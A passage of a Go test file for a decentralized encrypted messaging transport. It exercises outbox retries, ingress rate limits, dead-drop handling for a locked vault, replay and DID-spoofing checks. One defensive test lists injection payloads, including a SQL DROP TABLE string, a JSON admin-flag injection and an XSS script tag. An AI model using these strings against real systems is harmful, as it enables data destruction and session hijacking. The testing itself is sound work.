		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99}
	rcptPub, _, _ := signer.GenerateFromSeed(rcptSeed[:])

	resolver := &mockDIDResolver{docs: map[string]*domain.DIDDocument{
		"did:key:z6MkRecipientTest": {
			ID: "did:key:z6MkRecipientTest",
			VerificationMethod: []domain.VerificationMethod{{
				ID:                 "did:key:z6MkRecipientTest#key-1",
				Type:               "Ed25519VerificationKey2020",
				PublicKeyMultibase: "z" + base58.Encode(append([]byte{0xed, 0x01}, rcptPub...)),
			}},
			Service: []domain.ServiceEndpoint{{
				ID:              "#didcomm",
				Type:            "DIDCommMessaging",
				ServiceEndpoint: "https://recipient.test/msg",
			}},
		},
	}}

	outbox := testutil.NewMockOutboxManager()
	inbox := testutil.NewMockInboxManager()
	identitySigner := &mockIdentitySigner{priv: ed25519.PrivateKey(senderPriv)}

	svc := service.NewTransportService(encryptor, identitySigner, converter, resolver, outbox, inbox, clk)
	// Note: NO SetDeliverer call — deliverer is nil.

	ctx := context.Background()

	// Enqueue a message with a valid recipient DID that has a service endpoint.
	pendingMsg := domain.OutboxMessage{
		ID:        "no-deliverer-001",
		ToDID:     "did:key:z6MkRecipientTest",
		Payload:   []byte("encrypted-payload"),
		Status:    "pending",
		CreatedAt: time.Now().Unix(),
		NextRetry: time.Now().Unix(),
	}
	_, _ = outbox.Enqueue(ctx, pendingMsg)

	processed, err := svc.ProcessOutbox(ctx)
	if err != nil {
		t.Fatalf("ProcessOutbox: %v", err)
	}
	if processed != 1 {
		t.Fatalf("expected 1 processed, got %d", processed)
	}

	// Without deliverer, all messages should be marked failed.
	pending, _ := outbox.ListPending(ctx)
	if len(pending) != 0 {
		t.Fatalf("expected 0 pending (marked failed), got %d", len(pending))
	}
}

// TST-CORE-944: Context cancellation stops ProcessOutbox.
// Requirement: Cancel ctx immediately → Returns context.Canceled.
// The mock outbox's ListPending ignores context (returns data regardless),
// so ProcessOutbox will enter the loop with 5 pending messages and immediately
// hit the ctx.Done() select case on the first iteration, returning context.Canceled
// with 0 messages processed.
func TestAdv_29_2_OutboxContextCancel(t *testing.T) {
	env := newTransportTestEnv(t)

	// Enqueue multiple messages to ensure the loop has work to do.
	for i := 0; i < 5; i++ {
		msg := domain.OutboxMessage{
			ToDID:     "did:key:z6MkRecipientTest",
			Payload:   []byte("test"),
			Status:    "pending",
			CreatedAt: time.Now().Unix(),
			NextRetry: time.Now().Unix(),
		}
		_, _ = env.outbox.Enqueue(context.Background(), msg)
	}

	// Cancel context before calling ProcessOutbox — the select case must fire
	// before any message is processed.
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	processed, err := env.svc.ProcessOutbox(ctx)

	// Requirement: "Returns context.Canceled" — the error must be non-nil.
	if err == nil {
		t.Fatal("ProcessOutbox should return context.Canceled when context is already cancelled")
	}
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("expected context.Canceled, got: %v", err)
	}

	// With pre-cancelled context, no messages should have been processed —
	// the select fires before any delivery attempt.
	if processed != 0 {
		t.Fatalf("expected 0 messages processed with cancelled context, got %d", processed)
	}

	// Verify that all 5 messages remain pending (none delivered or failed).
	pending, _ := env.outbox.ListPending(context.Background())
	if len(pending) != 5 {
		t.Fatalf("expected all 5 messages still pending after context cancellation, got %d", len(pending))
	}
}

// ==========================================================================
// §A3 — Ingress Rate Limiting & Dead Drop (adversarial tests)
// ==========================================================================

// TST-CORE-947
// TST-ADV-012: RateLimiter rejects after IP rate limit exceeded.
func TestAdv_29_3_IngressIPRateLimit(t *testing.T) {
	tmpDir := t.TempDir()
	deadDrop := ingress.NewDeadDrop(filepath.Join(tmpDir, "dd"), 10000, 500*1024*1024)
	limiter := ingress.NewRateLimiter(5, time.Minute, 10000, 500*1024*1024, deadDrop)

	// 5 requests should pass (rate is 5 per minute).
	for i := 0; i < 5; i++ {
		if !limiter.AllowIP("1.2.3.4") {
			t.Fatalf("request %d should pass within rate limit", i+1)
		}
	}

	// 6th request should be rejected.
	if limiter.AllowIP("1.2.3.4") {
		t.Fatal("request exceeding IP rate limit should be rejected")
	}

	// Different IP should still be allowed.
	if !limiter.AllowIP("5.6.7.8") {
		t.Fatal("different IP should have its own rate limit bucket")
	}
}

// TST-CORE-948
// TST-ADV-013: Router.Ingest rejects after IP rate limit via ErrRateLimited.
func TestAdv_29_3_IngressRouterFlood(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
	limiter := ingress.NewRateLimiter(3, time.Minute, 10000, 500*1024*1024, deadDrop)

	vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{}}
	inbox := &mockInboxManager{}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)

	router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

	payload := []byte("encrypted-blob-data")
	ctx := context.Background()

	// First 3 should pass.
	for i := 0; i < 3; i++ {
		err := router.Ingest(ctx, "10.0.0.1", payload)
		if err != nil {
			t.Fatalf("request %d should pass: %v", i+1, err)
		}
	}

	// 4th from same IP should be rate limited.
	err := router.Ingest(ctx, "10.0.0.1", payload)
	if err == nil {
		t.Fatal("expected rate limit error on 4th request from same IP")
	}
	if !errors.Is(err, domain.ErrRateLimited) {
		t.Fatalf("expected ErrRateLimited, got: %v", err)
	}
}

// TST-CORE-949
// TST-ADV-014: Router stores to dead drop when vault is locked.
// Requirement: Ingest while vault locked → Dead drop count=1, inbox empty.
// The 3-Valve Defense routes messages to the dead drop filesystem when the
// vault DEK is not in RAM, preserving them for later processing after unlock.
func TestAdv_29_3_IngressDeadDropLocked(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
	limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

	// Vault is LOCKED (no open personas — DEK not in RAM).
	vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{}}
	inbox := &mockInboxManager{}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)

	router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

	ctx := context.Background()

	// Sub-test 1: Single message goes to dead drop, not inbox.
	t.Run("single_message_to_dead_drop", func(t *testing.T) {
		payload := []byte("encrypted-message-while-locked")

		err := router.Ingest(ctx, "10.0.0.1", payload)
		if err != nil {
			t.Fatalf("Ingest should succeed (store to dead drop): %v", err)
		}

		// Dead drop must have exactly 1 blob.
		count, err := deadDrop.Count()
		if err != nil {
			t.Fatalf("Count: %v", err)
		}
		if count != 1 {
			t.Fatalf("expected 1 dead drop blob, got %d", count)
		}

		// Inbox must be empty — message never reaches decryption path.
		if len(inbox.spoolData) != 0 {
			t.Fatalf("inbox should be empty when vault is locked, got %d items", len(inbox.spoolData))
		}
	})

	// Sub-test 2: Multiple messages accumulate in dead drop.
	t.Run("multiple_messages_accumulate", func(t *testing.T) {
		for i := 0; i < 3; i++ {
			payload := []byte(fmt.Sprintf("locked-msg-%d", i))
			err := router.Ingest(ctx, "10.0.0.2", payload)
			if err != nil {
				t.Fatalf("Ingest[%d] should succeed: %v", i, err)
			}
		}

		// Dead drop should now have 1 (from sub-test 1) + 3 = 4 blobs.
		count, err := deadDrop.Count()
		if err != nil {
			t.Fatalf("Count: %v", err)
		}
		if count != 4 {
			t.Fatalf("expected 4 dead drop blobs (1 prior + 3 new), got %d", count)
		}

		// Inbox still empty — no message leaked to decryption path.
		if len(inbox.spoolData) != 0 {
			t.Fatalf("inbox should remain empty, got %d items", len(inbox.spoolData))
		}
	})

	// Sub-test 3: Dead drop blobs are retrievable (Peek returns stored data).
	t.Run("blobs_retrievable_after_store", func(t *testing.T) {
		blobs, err := deadDrop.List()
		if err != nil {
			t.Fatalf("List: %v", err)
		}
		if len(blobs) != 4 {
			t.Fatalf("expected 4 blobs in List, got %d", len(blobs))
		}

		// Each blob should be peekable (readable without deletion).
		for _, blobID := range blobs {
			data, err := deadDrop.Peek(blobID)
			if err != nil {
				t.Fatalf("Peek(%s): %v", blobID, err)
			}
			if len(data) == 0 {
				t.Fatalf("Peek(%s) returned empty data", blobID)
			}
		}
	})
}

// TST-ADV-015: Router spools to inbox when vault is unlocked.
// TST-CORE-950
func TestAdv_29_3_IngressInboxUnlocked(t *testing.T) {
	// Requirement: When the vault is unlocked, ingested messages go to the
	// inbox (fast path), NOT the dead drop. The dead drop is ONLY for the
	// locked state. This validates Valve 3 of the 3-Valve Defense.

	t.Run("single_message_to_inbox", func(t *testing.T) {
		tmpDir := t.TempDir()
		deadDropDir := filepath.Join(tmpDir, "dd")
		deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
		limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

		personal, _ := domain.NewPersonaName("general")
		vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{personal: true}}
		inbox := &mockInboxManager{}
		sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)
		router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

		ctx := context.Background()
		payload := []byte("encrypted-message-while-unlocked")
		err := router.Ingest(ctx, "10.0.0.1", payload)
		if err != nil {
			t.Fatalf("Ingest should succeed: %v", err)
		}

		if len(inbox.spoolData) != 1 {
			t.Fatalf("expected 1 inbox spool item, got %d", len(inbox.spoolData))
		}

		count, _ := deadDrop.Count()
		if count != 0 {
			t.Fatalf("dead drop should be empty when vault is unlocked, got %d blobs", count)
		}
	})

	t.Run("multiple_messages_all_to_inbox", func(t *testing.T) {
		// Multiple messages ingested while unlocked must ALL go to inbox.
		tmpDir := t.TempDir()
		deadDropDir := filepath.Join(tmpDir, "dd")
		deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
		limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

		personal, _ := domain.NewPersonaName("general")
		vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{personal: true}}
		inbox := &mockInboxManager{}
		sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)
		router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)
		ctx := context.Background()

		for i := 0; i < 10; i++ {
			payload := []byte(fmt.Sprintf("encrypted-message-%d", i))
			err := router.Ingest(ctx, "10.0.0.1", payload)
			if err != nil {
				t.Fatalf("Ingest message %d failed: %v", i, err)
			}
		}

		if len(inbox.spoolData) != 10 {
			t.Fatalf("expected 10 inbox items, got %d", len(inbox.spoolData))
		}

		count, _ := deadDrop.Count()
		if count != 0 {
			t.Fatalf("dead drop should remain empty, got %d blobs", count)
		}
	})

	t.Run("message_content_preserved", func(t *testing.T) {
		// Message payload must arrive in the inbox byte-for-byte identical.
		tmpDir := t.TempDir()
		deadDropDir := filepath.Join(tmpDir, "dd")
		deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
		limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

		personal, _ := domain.NewPersonaName("general")
		vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{personal: true}}
		inbox := &mockInboxManager{}
		sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)
		router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

		original := []byte(`{"c":"base64-ciphertext-data","s":"hex-signature-data"}`)
		err := router.Ingest(context.Background(), "10.0.0.1", original)
		if err != nil {
			t.Fatalf("Ingest failed: %v", err)
		}

		if len(inbox.spoolData) != 1 {
			t.Fatalf("expected 1 inbox item, got %d", len(inbox.spoolData))
		}
		if string(inbox.spoolData[0]) != string(original) {
			t.Fatalf("payload corrupted in inbox:\n  want: %s\n  got:  %s", original, inbox.spoolData[0])
		}
	})

	t.Run("locked_vs_unlocked_routing_contrast", func(t *testing.T) {
		// Same message to locked vault → dead drop; to unlocked vault → inbox.
		// This validates the routing decision depends on vault state.
		tmpDir := t.TempDir()
		deadDropDir := filepath.Join(tmpDir, "dd")
		deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
		limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

		personal, _ := domain.NewPersonaName("general")
		vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{}}
		inbox := &mockInboxManager{}
		sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)
		router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)
		ctx := context.Background()

		// Phase 1: Vault LOCKED — message goes to dead drop.
		lockedPayload := []byte("msg-while-locked")
		err := router.Ingest(ctx, "10.0.0.2", lockedPayload)
		if err != nil {
			t.Fatalf("Ingest while locked failed: %v", err)
		}

		ddCount, _ := deadDrop.Count()
		if ddCount != 1 {
			t.Fatalf("locked: expected 1 dead drop blob, got %d", ddCount)
		}
		if len(inbox.spoolData) != 0 {
			t.Fatalf("locked: inbox should be empty, got %d items", len(inbox.spoolData))
		}

		// Phase 2: Vault UNLOCKED — message goes to inbox.
		vaultMgr.openPersonas[personal] = true

		unlockedPayload := []byte("msg-while-unlocked")
		err = router.Ingest(ctx, "10.0.0.3", unlockedPayload)
		if err != nil {
			t.Fatalf("Ingest while unlocked failed: %v", err)
		}

		if len(inbox.spoolData) != 1 {
			t.Fatalf("unlocked: expected 1 inbox item, got %d", len(inbox.spoolData))
		}
		// Dead drop count should still be 1 (from the locked phase).
		ddCount, _ = deadDrop.Count()
		if ddCount != 1 {
			t.Fatalf("unlocked: dead drop should still have 1 blob from locked phase, got %d", ddCount)
		}
	})

	t.Run("different_ips_all_to_inbox", func(t *testing.T) {
		// Messages from different IPs all go to inbox when unlocked.
		// Valve 1 (IP rate limit) doesn't affect routing destination.
		tmpDir := t.TempDir()
		deadDropDir := filepath.Join(tmpDir, "dd")
		deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
		limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

		personal, _ := domain.NewPersonaName("general")
		vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{personal: true}}
		inbox := &mockInboxManager{}
		sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)
		router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)
		ctx := context.Background()

		ips := []string{"10.0.0.1", "10.0.0.2", "192.168.1.1", "172.16.0.1", "8.8.8.8"}
		for _, ip := range ips {
			err := router.Ingest(ctx, ip, []byte("msg-from-"+ip))
			if err != nil {
				t.Fatalf("Ingest from %s failed: %v", ip, err)
			}
		}

		if len(inbox.spoolData) != 5 {
			t.Fatalf("expected 5 inbox items from different IPs, got %d", len(inbox.spoolData))
		}
		count, _ := deadDrop.Count()
		if count != 0 {
			t.Fatalf("dead drop should be empty, got %d", count)
		}
	})
}

// TST-CORE-951
// TST-ADV-016: Dead drop spool full rejects new messages (Valve 2).
func TestAdv_29_3_IngressSpoolFull(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	// Set very small capacity: 2 blobs max.
	deadDrop := ingress.NewDeadDrop(deadDropDir, 2, 500*1024*1024)
	limiter := ingress.NewRateLimiter(50, time.Minute, 2, 500*1024*1024, deadDrop)

	// Vault is locked → dead drop path.
	vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{}}
	inbox := &mockInboxManager{}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, &transportTestClock{now: time.Now()}, 24*time.Hour)

	router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

	ctx := context.Background()

	// Fill dead drop to capacity.
	_ = router.Ingest(ctx, "10.0.0.1", []byte("blob-1"))
	_ = router.Ingest(ctx, "10.0.0.2", []byte("blob-2"))

	// 3rd message should be rejected — spool full (Valve 2).
	err := router.Ingest(ctx, "10.0.0.3", []byte("blob-3"))
	if err == nil {
		t.Fatal("expected spool full error")
	}
	if !errors.Is(err, domain.ErrSpoolFull) {
		t.Fatalf("expected ErrSpoolFull, got: %v", err)
	}
}

// TST-ADV-017: Sweeper skips dead drop blobs when keys not configured (fail-closed).
// SEC-LOW-03: Without decrypt prerequisites, blobs are skipped (not delivered).
func TestAdv_29_3_IngressSweeperSweep(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)

	clk := &transportTestClock{now: time.Now()}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, clk, 24*time.Hour)
	// No keys/converter set — sweeper skips blobs (fail-closed per SEC-LOW-03).

	ctx := context.Background()

	// Store some blobs manually (simulating messages received while locked).
	os.MkdirAll(deadDropDir, 0700)
	os.WriteFile(filepath.Join(deadDropDir, "blob1.blob"), []byte("data1"), 0600)
	os.WriteFile(filepath.Join(deadDropDir, "blob2.blob"), []byte("data2"), 0600)

	count, err := sweeper.Sweep(ctx)
	if err != nil {
		t.Fatalf("Sweep: %v", err)
	}
	// Without decrypt keys, blobs are skipped (fail-closed), not delivered.
	if count != 0 {
		t.Fatalf("expected 0 swept (no keys configured), got %d", count)
	}
}

// TST-CORE-953
// TST-ADV-018: Router.ProcessPending sweeps dead drop + processes inbox spool.
func TestAdv_29_3_IngressProcessPending(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
	limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

	vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{}}
	inbox := &mockInboxManager{}
	clk := &transportTestClock{now: time.Now()}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, clk, 24*time.Hour)

	router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

	ctx := context.Background()

	// Ingest while locked → dead drop.
	_ = router.Ingest(ctx, "10.0.0.1", []byte("locked-msg-1"))
	_ = router.Ingest(ctx, "10.0.0.2", []byte("locked-msg-2"))

	count, _ := deadDrop.Count()
	if count != 2 {
		t.Fatalf("expected 2 dead drop blobs, got %d", count)
	}

	// ProcessPending attempts to sweep dead drop — but without keys configured,
	// blobs are skipped (fail-closed per SEC-LOW-03). Blobs remain in dead drop.
	total, err := router.ProcessPending(ctx)
	if err != nil {
		t.Fatalf("ProcessPending: %v", err)
	}
	// Without decrypt keys, no blobs are delivered — they stay in dead drop.
	if total != 0 {
		t.Fatalf("expected 0 processed (no keys configured), got %d", total)
	}
}

// TST-CORE-954
// TST-ADV-019: Oversized payload rejected at ingress.
func TestAdv_29_3_IngressOversizedPayload(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)
	limiter := ingress.NewRateLimiter(50, time.Minute, 10000, 500*1024*1024, deadDrop)

	personal, _ := domain.NewPersonaName("general")
	vaultMgr := &mockVaultManager{openPersonas: map[domain.PersonaName]bool{personal: true}}
	inbox := &mockInboxManager{}
	clk := &transportTestClock{now: time.Now()}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, clk, 24*time.Hour)

	router := ingress.NewRouter(vaultMgr, inbox, deadDrop, sweeper, limiter)

	// Payload >256KB should be rejected.
	oversized := make([]byte, 256*1024+1)
	err := router.Ingest(context.Background(), "10.0.0.1", oversized)
	if err == nil {
		t.Fatal("expected error for oversized payload")
	}
}

// TST-CORE-955
// TST-ADV-020: SweepFull returns detailed results.
func TestAdv_29_3_IngressSweepFull(t *testing.T) {
	tmpDir := t.TempDir()
	deadDropDir := filepath.Join(tmpDir, "dd")
	deadDrop := ingress.NewDeadDrop(deadDropDir, 10000, 500*1024*1024)

	clk := &transportTestClock{now: time.Now()}
	sweeper := ingress.NewSweeper(deadDrop, nil, nil, clk, 24*time.Hour)

	// Store blobs manually.
	os.MkdirAll(deadDropDir, 0700)
	os.WriteFile(filepath.Join(deadDropDir, "good.blob"), []byte("valid-data"), 0600)
	os.WriteFile(filepath.Join(deadDropDir, "empty.blob"), []byte{}, 0600)

	result, err := sweeper.SweepFull(context.Background())
	if err != nil {
		t.Fatalf("SweepFull: %v", err)
	}

	if result.Processed != 2 {
		t.Fatalf("expected 2 processed, got %d", result.Processed)
	}
	// SEC-LOW-03: Without keys, blobs are skipped (fail-closed) — counted as Failed.
	if result.Failed != 2 {
		t.Fatalf("expected 2 failed (no keys, fail-closed), got %d", result.Failed)
	}
	if result.Delivered != 0 {
		t.Fatalf("expected 0 delivered (no keys), got %d", result.Delivered)
	}
}

// ==========================================================================
// §A4 — Replay & DID Spoofing (adversarial tests)
// ==========================================================================

// TST-ADV-021: Replayed message with same ID is detected via outbox dedup.
// Architecture §9: "msg_id prevents replay — each message has a unique ULID."
func TestAdv_29_4_ReplayDuplicateID(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	msg := domain.DinaMessage{
		ID:          "msg-replay-001",
		Type:        domain.MsgTypeSocialUpdate,
		From:        "did:key:z6MkSenderTest",
		To:          []string{"did:key:z6MkRecipientTest"},
		CreatedTime: time.Now().Unix(),
		Body:        []byte(`{"q":"first send"}`),
	}

	// First send succeeds.
	err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
	if err != nil {
		t.Fatalf("first SendMessage: %v", err)
	}

	// Construct the signed+encrypted envelope for receive.
	plaintext, _ := json.Marshal(msg)
	sig, _ := env.signer.Sign(env.senderPriv, plaintext)
	rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
	ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

	envelope := domain.DinaEnvelope{
		Typ:        "application/dina-encrypted+json",
		FromKID:    "did:key:z6MkSenderTest#key-1",
		ToKID:      "did:key:z6MkRecipientTest#key-1",
		Ciphertext: string(ciphertext),
		Sig:        hex.EncodeToString(sig),
	}

	// First receive — should succeed.
	result1, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err != nil {
		t.Fatalf("first ReceiveMessage: %v", err)
	}
	env.svc.StoreInbound(result1)

	// Second receive of the SAME envelope — replay.
	// The service stores messages; check the inbox has a duplicate.
	result2, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err != nil {
		t.Fatalf("replay ReceiveMessage should still decrypt: %v", err)
	}

	// Both messages have the same ID — the application layer should detect this.
	// At the transport level, decryption succeeds but message ID is identical.
	if result1.ID != result2.ID {
		t.Fatalf("replay message should have same ID, got %q vs %q", result1.ID, result2.ID)
	}

	// Store the replay and verify inbox has 2 messages with same ID.
	// Defense: application layer deduplicates by msg.ID.
	env.svc.StoreInbound(result2)
	inbox := env.svc.GetInbound()
	dupCount := 0
	for _, m := range inbox {
		if m.ID == "msg-replay-001" {
			dupCount++
		}
	}
	// Currently the transport stores both — this test documents that
	// replay prevention must happen at the application layer (msg_id dedup).
	if dupCount < 2 {
		t.Logf("WARNING: replay resulted in %d inbox entries — application-layer dedup needed", dupCount)
	}
	t.Logf("Replay detection: %d messages with same ID in inbox (application layer should dedup)", dupCount)
}

// TST-CORE-957
// TST-ADV-022: Envelope claims sender DID that doesn't match the actual signer.
// Architecture §9: "mutual authentication — both Dinas verify Ed25519 signatures."
func TestAdv_29_4_DIDSpoofingFromKID(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Attacker constructs message claiming to be from sender
	// but signs with recipient's key (attacker controls recipient key).
	msg := domain.DinaMessage{
		ID:          "msg-spoof-001",
		Type:        domain.MsgTypeSocialUpdate,
		From:        "did:key:z6MkSenderTest", // claims to be sender
		To:          []string{"did:key:z6MkRecipientTest"},
		CreatedTime: time.Now().Unix(),
		Body:        []byte(`{"q":"spoofed sender"}`),
	}
	plaintext, _ := json.Marshal(msg)

	// Sign with RECIPIENT's key (wrong key — not the declared sender).
	wrongSig, _ := env.signer.Sign(env.rcptPriv, plaintext)

	// Encrypt for recipient (this part is correct).
	rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
	ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

	envelope := domain.DinaEnvelope{
		Typ:        "application/dina-encrypted+json",
		FromKID:    "did:key:z6MkSenderTest#key-1", // claims sender's KID
		ToKID:      "did:key:z6MkRecipientTest#key-1",
		Ciphertext: string(ciphertext),
		Sig:        hex.EncodeToString(wrongSig), // signed by wrong key
	}

	// ReceiveMessage resolves the declared sender DID and verifies the signature
	// against the sender's public key from DID Document. Since the signature was
	// made with a different key, verification must fail.
	_, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err == nil {
		t.Fatal("ReceiveMessage should reject spoofed sender DID (signature mismatch)")
	}
	if !errors.Is(err, domain.ErrInvalidSignature) {
		t.Fatalf("expected ErrInvalidSignature for DID spoofing, got: %v", err)
	}
}

// TST-ADV-023: Outbox rejects new messages when queue is full (100 limit).
// Architecture §9: "Outbox Queue Limit: 100 pending messages."
func TestAdv_29_2_OutboxQueueLimit(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Set max queue to 5 for test.
	env.outbox.MaxQueue = 5

	// Make deliverer fail so messages stay pending.
	env.deliverer.err = errors.New("offline")

	for i := 0; i < 5; i++ {
		msg := domain.DinaMessage{
			ID:   fmt.Sprintf("msg-queue-%d", i),
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"queue test"}`),
		}
		err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		if err != nil {
			t.Fatalf("SendMessage %d: %v", i, err)
		}
	}

	// 6th message should fail because outbox is full.
	msg6 := domain.DinaMessage{
		ID:   "msg-queue-overflow",
		Type: domain.MsgTypeSocialUpdate,
		From: "did:key:z6MkSenderTest",
		To:   []string{"did:key:z6MkRecipientTest"},
		Body: []byte(`{"q":"overflow"}`),
	}
	err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg6)
	if err == nil {
		t.Fatal("SendMessage should fail when outbox queue is full")
	}
	// Error message should indicate the queue is full.
	if !strings.Contains(err.Error(), "full") && !strings.Contains(err.Error(), "outbox") {
		t.Logf("Queue full error: %v", err)
	}
}

// TST-CORE-946
// TST-ADV-024: Outbox retry count increments on repeated failures.
// Architecture §9: "max 5 retries, backoff 30s→1m→5m→30m→2h."
func TestAdv_29_2_OutboxRetryCount(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Make deliverer fail persistently.
	env.deliverer.err = errors.New("connection refused")

	msg := domain.DinaMessage{
		ID:   "msg-retry-count",
		Type: domain.MsgTypeSocialUpdate,
		From: "did:key:z6MkSenderTest",
		To:   []string{"did:key:z6MkRecipientTest"},
		Body: []byte(`{"q":"retry count test"}`),
	}
	_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

	// Run ProcessOutbox multiple times with requeue between each.
	for attempt := 0; attempt < 3; attempt++ {
		env.svc.ProcessOutbox(ctx)

		// Requeue failed message for next attempt.
		stored, _ := env.outbox.GetByID("outbox-1")
		if stored != nil && stored.Status == "failed" {
			_ = env.outbox.Requeue(ctx, stored.ID)
		}
	}

	// Final ProcessOutbox.
	env.svc.ProcessOutbox(ctx)

	// The message should have been attempted multiple times.
	// At minimum 4 delivery calls: 1 immediate + 3 ProcessOutbox rounds.
	if len(env.deliverer.calls) < 4 {
		t.Fatalf("expected at least 4 delivery attempts, got %d", len(env.deliverer.calls))
	}
}

// TST-CORE-958 TST-CORE-959 TST-CORE-960 TST-CORE-961 TST-CORE-962
// TST-ADV-025: Malicious message body with injection payloads is safely deserialized.
// Architecture §19: "Serialization boundary — type/length validation."
func TestAdv_29_5_PromptInjectionBodySafe(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Craft messages with various injection payloads in the Body field.
	injectionPayloads := []struct {
		name string
		body []byte
	}{
		{"sql_injection", []byte(`{"q":"'; DROP TABLE users; --"}`)},
		{"json_escape", []byte(`{"q":"test\",\"admin\":true,\"x\":\""}`)},
		{"oversized_field", []byte(`{"q":"` + strings.Repeat("A", 10000) + `"}`)},
		{"null_bytes", []byte("{\"q\":\"test\x00injection\"}")},
		{"nested_json", []byte(`{"q":"{\"nested\":{\"deep\":{\"a\":1}}}"}`)},
		{"html_xss", []byte(`{"q":"<script>alert('xss')</script>"}`)},
	}

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			msg := domain.DinaMessage{
				ID:          "msg-inject-" + tc.name,
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkSenderTest",
				To:          []string{"did:key:z6MkRecipientTest"},
				CreatedTime: time.Now().Unix(),
				Body:        tc.body,
			}
			plaintext, err := json.Marshal(msg)
			if err != nil {
				t.Fatalf("marshal: %v", err)
			}

			sig, _ := env.signer.Sign(env.senderPriv, plaintext)
			rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
